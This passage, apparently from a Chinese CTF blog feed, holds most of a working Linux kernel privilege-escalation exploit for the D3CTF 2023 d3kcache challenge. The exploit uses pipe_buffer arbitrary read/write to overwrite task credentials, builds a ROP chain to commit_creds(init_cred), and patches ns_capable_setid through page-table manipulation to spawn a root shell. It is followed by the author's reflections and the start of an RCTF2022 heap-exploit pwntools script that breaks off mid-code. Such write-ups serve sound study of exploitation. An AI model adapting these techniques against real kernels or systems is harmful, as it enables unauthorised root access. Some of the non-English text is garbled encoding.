class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">            tsk_buf[<span class="number">363</span>] = init_cred;</span><br><span class="line">            tsk_buf[<span class="number">364</span>] = init_cred;</span><br><span class="line">            tsk_buf[<span class="number">377</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">            arbitrary_write_by_pipe((struct page *)current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">            arbitrary_write_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>),</span><br><span class="line">                                    &amp;buf[<span class="number">512</span> * <span class="number">8</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            get_shell();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading current task_struct...&quot;</span>);</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">size_t</span> current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)current_task_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">            stack_addr = tsk_buf[<span class="number">4</span>];</span><br><span class="line">            mm_struct_addr = tsk_buf[<span class="number">292</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>, stack_addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>, mm_struct_addr);</span><br><span class="line"></span><br><span class="line">            mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>, mm_struct_page);</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((struct page *)mm_struct_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(mm_struct_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            mm_struct_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (mm_struct_addr &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">            pgd_addr = mm_struct_buf[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                   pgd_addr);</span><br><span class="line">        &#125;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading page table...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>];</span><br><span class="line">            <span class="keyword">size_t</span> idx = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">uint64_t</span> stack_addr_another;</span><br><span class="line">            <span class="keyword">size_t</span> pud_addr, pmd_addr, pte_addr, pte_val;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">            pud_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PGD_ENTRY(stack_addr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">            pmd_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PUD_ENTRY(stack_addr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">            pte_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PMD_ENTRY(stack_addr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">            pte_val = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PTE_ENTRY(stack_addr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line"></span><br><span class="line">            stack_addr_another = pte_val;</span><br><span class="line">            stack_addr_another &amp;= (~PAGE_ATTR_NX);</span><br><span class="line">            stack_addr_another += page_offset_base;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                   stack_addr_another);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ((<span class="number">0x1000</span> - <span class="number">0x100</span>) / <span class="number">8</span>); i++)</span><br><span class="line">            &#123;</span><br><span class="line">                rop[idx++] = RET + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            rop[idx++] = POP_RDI_RET + kernel_offset;</span><br><span class="line">            rop[idx++] = INIT_CRED + kernel_offset;</span><br><span class="line">            rop[idx++] = COMMIT_CREDS + kernel_offset;</span><br><span class="line">            rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">54</span> + kernel_offset;</span><br><span class="line">            rop[idx++] = *(<span class="keyword">size_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">            rop[idx++] = *(<span class="keyword">size_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">            rop[idx++] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">            rop[idx++] = user_cs;</span><br><span class="line">            rop[idx++] = user_rflags;</span><br><span class="line">            rop[idx++] = user_sp;</span><br><span class="line">            rop[idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">uint64_t</span> stack_page = direct_map_addr_to_page_addr(stack_addr_another);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">            arbitrary_write_by_pipe((struct page *)(stack_page + <span class="number">0x40</span> * <span class="number">3</span>), rop, <span class="number">0xff0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading current task_struct...&quot;</span>);</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">size_t</span> current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)current_task_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">            stack_addr = tsk_buf[<span class="number">4</span>];</span><br><span class="line">            mm_struct_addr = tsk_buf[<span class="number">292</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>, stack_addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>, mm_struct_addr);</span><br><span class="line"></span><br><span class="line">            mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>, mm_struct_page);</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((struct page *)mm_struct_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(mm_struct_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            mm_struct_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (mm_struct_addr &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">            pgd_addr = mm_struct_buf[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                   pgd_addr);</span><br><span class="line">        &#125;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> *kcode_map;</span><br><span class="line">            <span class="keyword">size_t</span> dst_paddr, dst_vaddr;</span><br><span class="line"></span><br><span class="line">            kcode_map = mmap((<span class="keyword">void</span> *)<span class="number">0x114514000</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                             MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (!kcode_map)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to create mmap area!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                kcode_map[i] = <span class="string">&quot;0x196082&quot;</span>[i];</span><br><span class="line">                kcode_map[i + <span class="number">0x1000</span>] = <span class="string">&quot;0x196082&quot;</span>[i];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            dst_vaddr = NS_CAPABLE_SETID + kernel_offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>, dst_vaddr);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">size_t</span> pud_addr, pmd_addr;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">            pud_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PGD_ENTRY(dst_vaddr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">            pmd_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PUD_ENTRY(dst_vaddr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">            dst_paddr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PMD_ENTRY(dst_vaddr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line"></span><br><span class="line">            dst_paddr += <span class="number">0x1000</span> * PTE_ENTRY(dst_vaddr);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                   dst_paddr);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">size_t</span> pte_addr;</span><br><span class="line">            &#123;</span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">                pud_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PGD_ENTRY(<span class="number">0x114514000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">                pmd_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PUD_ENTRY(<span class="number">0x114514000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">                pte_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PMD_ENTRY(<span class="number">0x114514000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">                *(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PTE_ENTRY(<span class="number">0x114514000</span>)) = dst_paddr | <span class="number">0x8000000000000867</span>;</span><br><span class="line">                arbitrary_write_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf, <span class="number">0xff0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#123;</span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">                pud_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PGD_ENTRY(<span class="number">0x114514000</span> + <span class="number">0x1000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">                pmd_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PUD_ENTRY(<span class="number">0x114514000</span> + <span class="number">0x1000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">                pte_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PMD_ENTRY(<span class="number">0x114514000</span> + <span class="number">0x1000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">                *(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PTE_ENTRY(<span class="number">0x114514000</span> + <span class="number">0x1000</span>)) = (dst_paddr + <span class="number">0x1000</span>) | <span class="number">0x8000000000000867</span>;</span><br><span class="line">                arbitrary_write_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf, <span class="number">0xff0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Start overwriting kernel code segment...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * The setresuid() check for user&#x27;s permission by ns_capable_setid(),</span></span><br><span class="line"><span class="comment">             * so we can just patch it to let it always return true :)</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="built_in">memset</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>), <span class="string">&#x27;\x90&#x27;</span>, <span class="number">0x40</span>);</span><br><span class="line">            <span class="built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>) + <span class="number">0x40</span>,</span><br><span class="line">                   <span class="string">&quot;\xf3\x0f\x1e\xfa&quot;</span></span><br><span class="line">                   <span class="string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span></span><br><span class="line">                   <span class="string">&quot;\xc3&quot;</span>,</span><br><span class="line">                   <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">            setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            get_shell();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230524153518128.png"                      alt="image-20230524153518128"                ><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230524160032198.png"                      alt="image-20230524160032198"                ><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230524162232568.png"                      alt="image-20230524162232568"                ></p><h3 id="æœ¬äººå½“æ—¶åšçš„ç¬¨åŠæ³•"><a href="#æœ¬äººå½“æ—¶åšçš„ç¬¨åŠæ³•" class="headerlink" title="æœ¬äººå½“æ—¶åšçš„ç¬¨åŠæ³•"></a>æœ¬äººå½“æ—¶åšçš„ç¬¨åŠæ³•</h3><p>å› ä¸ºå½“æ—¶æ³¨æ„åˆ°å­˜åœ¨<code>off by null</code>æ¼æ´ï¼Œç¬¬ä¸€ååº”å°±æ˜¯åˆ©ç”¨<code>msg_msg</code>ç»“æ„ä½“æ¥åšè¿™é“é¢˜ã€‚å±äºæ˜¯ççŒ«ç¢°åˆ°æ­»è€—å­ï¼Œæˆ‘åœ¨æ²¡æœ‰è€ƒè™‘é¡µçº§å †é£æ°´çš„æƒ…å†µä¸‹ç”³è¯·çš„<code>msg_msg</code>çš„<code>order</code>æ­£å¥½ä¸º3ï¼Œä¹Ÿå¯¼è‡´æœ‰ä¸€å®šçš„å‡ ç‡èƒ½å¤Ÿè¾¾åˆ°UAFçš„æ•ˆæœã€‚è‡ªç„¶ï¼Œæˆ‘çš„ç¬¬ä¸€ååº”ä¹Ÿæ˜¯ä¿®æ”¹<code>cred</code>ç»“æ„ä½“ï¼Œè™½ç„¶èƒ½å¤ŸæˆåŠŸæ‰¾åˆ°ä½†æ˜¯æˆåŠŸç‡ååˆ†çš„ä½ï¼Œæ¯æ¬¡è°ƒè¯•éœ€è¦æ‰‹åŠ¨è·‘äºŒåå¤šåˆ†é’Ÿï¼Œå› ä¸ºå†…å­˜ä¸­æœ‰ä¸€å¤§å—å­˜æ”¾ç€å„ç§æŒ‡é’ˆï¼Œå¯¼è‡´æ— æ³•ç»§ç»­å¾€ä¸‹æœç´¢å‡ºç°<code>kernel panic</code>ï¼Œå¹¶ä¸”åœ¨æ”¹å›æ™®é€šç”¨æˆ·æƒé™åå‡ºç°äº†è¿™ç¯‡æ–‡ç« å¼€å¤´éƒ¨åˆ†æåˆ°çš„<code>io_uring</code>çš„é—®é¢˜ï¼Œæ‰€ä»¥ä¹Ÿå°±æ”¾å¼ƒäº†è¿™ä¸€æ–¹æ³•ã€‚</p><p>ç„¶è€Œï¼Œå› ä¸ºå½“æ—¶ä¸æ¸…æ¥šCFIçš„ä½œç”¨åˆè·‘å»æ”¹opså»äº†ï¼Œè°ƒäº†åŠå¤©å‘ç°æ°¸è¿œä¼šåœ¨æœ€åä¸€æ­¥é€ æˆ<code>panic</code>ï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰æ‰¾åˆ°å¯ä»¥ç”¨æ¥å®ç°æ ˆè¿ç§»çš„<code>gadget</code>ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•ä¹Ÿè¢«æ”¾å¼ƒäº†ã€‚åˆšåˆšç»“æŸæ¯”èµ›çœ‹äº†NULLçš„wpä¹‹åå°±è§‰å¾—è‡ªå·±æ˜¯çœŸçš„å¤ªè ¢äº†ï¼Œåˆ†æ˜å¯ä»¥ç›´æ¥ä¿®æ”¹<code>pipe_buffer</code>äº†å±…ç„¶æ²¡æœ‰æƒ³åˆ°<code>Dirty Pipe</code>ï¼Œè™½ç„¶å¢¨æ™šé¸¢ä½¬è¯´è¿™ä¸æ˜¯æœ€ä¼˜è§£ï¼Œä½†æ˜¯æ˜¯æˆ‘å”¯ä¸€èƒ½å¤Ÿåšå‡ºæ¥çš„æ–¹æ³•æˆ‘å±…ç„¶æ²¡æƒ³åˆ°ï¼Œæˆ‘æ˜¯çœŸçš„è ¢ï¼ï¼ï¼</p><hr><p>å‚è€ƒé“¾æ¥ï¼š</p><p>â€‹    <a class="link"   href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/#Final-Exploitation" >https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/#Final-Exploitation<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://elixir.bootlin.com/linux/v6.2.12/source" >https://elixir.bootlin.com/linux/v6.2.12/source<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img  
                     lazyload
                     src=&quot;/images/loading.svg&quot;
                     data-src=&quot;/images/image-20230510</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    
    <category term="msg_msg" scheme="https://196082.github.io/tags/msg-msg/"/>
    
    <category term="pipe_buffer" scheme="https://196082.github.io/tags/pipe-buffer/"/>
    
    <category term="io_uring" scheme="https://196082.github.io/tags/io-uring/"/>
    
    <category term="é¡µçº§å †é£æ°´" scheme="https://196082.github.io/tags/%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4/"/>
    
  </entry>
  
  <entry>
    <title>RCTF2022å¤ç°</title>
    <link href="https://196082.github.io/2023/04/22/RCTF2022%E5%A4%8D%E7%8E%B0/"/>
    <id>https://196082.github.io/2023/04/22/RCTF2022%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-04-22T05:35:06.000Z</published>
    <updated>2023-04-24T12:39:40.207Z</updated>
    
    <content type="html"><![CDATA[<h2 id="diary"><a href="#diary" class="headerlink" title="diary"></a>diary</h2><h3 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>å°±æ˜¯ä¸€é“å¾ˆæ­£å¸¸çš„ç”¨æˆ·æ€å †é¢˜ã€‚åœ¨<code>delete</code>å‡½æ•°ä¸­å­˜åœ¨UAFæ¼æ´ã€‚</p><p>ä¸è¿‡é¢˜ç›®çš„é€†å‘è¿‡ç¨‹æ¯”è¾ƒéº»çƒ¦ï¼ŒåŠ ä¹‹æˆ‘å¼€å§‹æ²¡æ³¨æ„åˆ°é¢˜ç›®å·²ç»ç»™äº†è¾“å…¥commandçš„æ ¼å¼ï¼Œå¦‚æœæ³¨æ„åˆ°çš„è¯åŠ¨æ€è°ƒè¯•æ¥é€†å‘æ›´ä¸ºç®€å•ã€‚</p><p>é¢˜ç›®å¾ˆç®€å•ï¼Œåˆ©ç”¨UAFä½¿å¾—<code>tcache</code>å’Œ<code>unsorted bin</code>ä¸­åŒæ—¶å­˜åœ¨ä¸€ä¸ªchunkï¼Œæ³„æ¼å‡ºlibcåœ°å€ã€‚åˆ©ç”¨<code>encrypt</code>å‡½æ•°åˆ†é…åˆ°<code>unsorted bin</code>ä¸­çš„chunkè¿›è€Œä¿®æ”¹åˆ°tcacheä¸­chunkçš„fdæŒ‡é’ˆæŒ‡å‘<code>__free_hook</code>å³å¯ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;add#1#1#1#1#1#&#123;&#125;#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx), content)</span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;update#&#123;&#125;#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx), content)</span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    